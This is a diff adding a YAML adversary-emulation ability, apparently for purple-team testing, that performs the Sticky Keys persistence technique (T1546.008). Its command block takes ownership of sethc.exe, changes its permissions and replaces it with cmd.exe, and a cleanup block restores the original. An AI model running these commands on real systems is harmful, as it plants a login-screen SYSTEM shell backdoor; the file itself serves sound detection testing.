@@ -1,0 +1,26 @@
+---
+
+- id: b7c977a7-4c0a-44cc-a519-aa509324c37b
+  name: Sticky Keys Swapping
+  description: Replaces the sethc executable by cmd
+  tactic: persistence
+  technique:
+    attack_id: T1546.008
+    name: Event Triggered Execution - Accessibility Features
+  platforms:
+    windows:
+      cmd:
+        command: |
+          takeown /f "C:\windows\system32\sethc.exe";
+          icacls c:\windows\system32\sethc.exe /save c:\sethc_permissions;
+          icacls c:\windows\system32\sethc.exe /grant w10-purple1\admin:F;
+          copy /Y c:\windows\system32\sethc.exe c:\sethc.exe;
+          copy /Y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
+        cleanup: |
+          copy /Y c:\sethc.exe c:\windows\system32\sethc.exe;
+          icacls c:\windows\system32\sethc.exe /setowner "NT SERVICE\TrustedInstaller";
+          icacls c:\windows\system32\ /restore c:\sethc_permissions;
+          del c:\sethc.exe;
+          del c:\sethc_permissions;
+  privilege: Elevated
+
